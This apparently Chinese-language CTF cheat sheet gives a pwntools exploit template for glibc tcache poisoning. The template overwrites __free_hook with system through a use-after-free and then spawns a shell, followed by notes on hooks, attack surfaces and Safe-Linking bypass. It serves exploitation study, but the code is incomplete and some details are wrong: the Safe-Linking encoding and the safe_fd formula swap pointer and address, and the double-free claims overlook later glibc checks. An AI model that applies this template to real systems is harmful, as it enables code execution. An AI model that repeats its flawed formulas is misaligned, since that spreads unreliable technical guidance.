
# 模板概览与入口

本模板提供了 `Tcache Poisoning` (Tcache 投毒) 攻击的 `pwntools` EXP 骨架。该攻击通过 Use-After-Free (UAF) 或堆溢出漏洞，修改一个已释放到 tcache 中的 chunk 的 `fd` 指针，使其指向任意目标地址（如 `__free_hook`）。随后，连续两次 `malloc` 就能获得一个指向目标地址的 "fake chunk"，从而实现任意地址写，并最终通过劫持 `__free_hook` 为 `system` 来获取 Shell。

此模板适用于 glibc 2.26 - 2.31（无 Safe-Linking 保护）的环境，是现代堆利用中最常用、最直接的 RCE 手段之一。

**核心入口代码片段**：

```python
from pwn import *

# --- 环境设置 ---
context.arch = 'amd64'
elf = ELF('./your_binary')
libc = ELF('./libc.so.6')

# --- 漏洞利用函数 (示例) ---
def add(size, data):
    # ...
def delete(index):
    # ...
def edit(index, data): # UAF 的入口
    # ...

# --- 漏洞利用 ---
# 1. 泄露 libc 基地址 (假设已完成)
# libc.address = ...

# 2. 计算目标地址
free_hook = libc.symbols['__free_hook']
system = libc.symbols['system']

# 3. Tcache Poisoning
log.info("Performing Tcache Poisoning...")
add(0x30, b'victim')      # chunk 0, size 0x40
add(0x30, b'guard')       # chunk 1

delete(0) # a 进入 0x40 tcache bin

# UAF: 修改 a 的 fd 指针为 __free_hook
log.info(f"Poisoning tcache chunk's fd to {hex(free_hook)}")
edit(0, p64(free_hook)) 

# 4. 获取任意地址写并触发
add(0x30, b'dummy') # 分配出原始的 chunk 0

# 再次分配，得到 __free_hook 的地址，并写入 system
log.info(f"Overwriting __free_hook with system...")
add(0x30, p64(system)) # 这次 add 返回的是 __free_hook 的地址

# 5. 获取 Shell
log.info("Triggering shell...")
add(0x20, b'/bin/sh\x00') # chunk 4
delete(4) # free("/bin/sh") -> system("/bin/sh")

io.interactive()
```

# 攻击关键点速查

- **重要钩子 (Key Hooks)**
  - **`fd` (next) 指针**: 位于 tcache 空闲 chunk 的起始位置，是投毒的核心目标。覆盖它就等于污染了 tcache 链表。
  - **`__free_hook`**: 经典的 RCE 终点。将其覆盖为 `system` 地址，再 `free` 一个内容为 `"/bin/sh"` 的 chunk 即可拿 Shell。
  - **`__malloc_hook`**: 另一个可利用的 hook，覆盖为 one-gadget 地址后，在下次 `malloc` 时有机会触发。

- **关键结构体 (Key Structures)**
  - **Tcache Bin**: 一个后进先出 (LIFO) 的单向链表。
    - 投毒前: `bin -> A -> NULL`
    - 投毒后: `bin -> A -> target_addr`
  - **Fake Chunk**: `malloc` 从被污染的 tcache 链表中返回的目标地址，被程序误认为是一个合法的堆块。

- **主要攻击面 (Main Attack Surfaces)**
  - **Use-After-Free (UAF)**: 允许在 `free` 后继续 `edit` 一个 chunk，是修改 `fd` 指针最直接的方式。
  - **堆溢出**: 通过溢出前一个 chunk，覆盖到紧邻的、已 `free` 的 tcache chunk 的 `fd` 指针。
  - **Double Free**: 在 tcache 中，连续 `free` 同一个 chunk 两次（glibc 2.26）或 `free(A); free(B); free(A)`（更高版本）可以形成循环链表，这也是一种强大的任意地址分配原语。

# 迭代扩展思路

- **从骨架到稳定 EXP 的演进**
  1.  **适配 Safe-Linking (glibc >= 2.32)**:
      -   **原理**: `fd` 指针被加密为 `(L >> 12) ^ P`，其中 `P` 是 chunk 地址，`L` 是 `fd` 明文。
      -   **演进**:
          1.  必须先通过 unsorted bin attack 或其他方式**泄露一个堆地址**，从而得到 `P` 的基址。
          2.  计算加密后的 `fd`: `safe_fd = (target_addr >> 12) ^ chunk_address`。
          3.  `edit` 时写入 `safe_fd` 而不是明文 `target_addr`。
          -   或者，利用 Tcache Double Free 形成 `A -> B -> A` 的循环，`malloc` 出 `A` 后，再修改 `A` 的 `fd` 指针。此时 `A` 仍在 tcache 链表中，可以绕过 Safe-Linking 的某些检查。
  2.  **选择其他目标地址**:
      -   如果 `__free_hook` 不可用，可以考虑覆盖 GOT 表项（如果 RELRO 不是 Full）、栈上的返回地址（需要先泄露栈地址）、或 `__malloc_hook`。
      -   **栈地址泄露**: 如果能通过 UAF 泄露一个堆块的 `fd` 指针，而该指针指向一个 unsorted bin chunk，则可以进一步泄露 libc 地址。如果泄露的地址在 `environ` 符号附近，可以进一步泄露栈地址。
  3.  **处理堆布局的复杂性**:
      -   在 EXP 开头申请和释放一些不同大小的 chunk，以“清理”和稳定 tcache 和 bins 的状态，避免受到程序启动时已有堆活动的影响。
      -   精确计算 `malloc` 的大小。`malloc(0x38)` 会进入 `0x40` 的 tcache bin。务必使用 `pwndbg` 的 `heap` 命令确认 chunk 的实际大小和 bin 的索引。
  4.  **结合 Unsorted Bin 泄露 libc**: 一个完整的 tcache poisoning EXP 通常是组合拳：
      -   **第一步**: 构造一个 unsorted bin chunk，通过 UAF 打印其 `fd` 指针，从而泄露 `main_arena` 的地址，计算出 libc 基址。
      -   **第二步**: 执行本模板中的 tcache poisoning 流程，利用泄露的 libc 基址计算 `__free_hook` 和 `system` 的地址，完成 RCE。
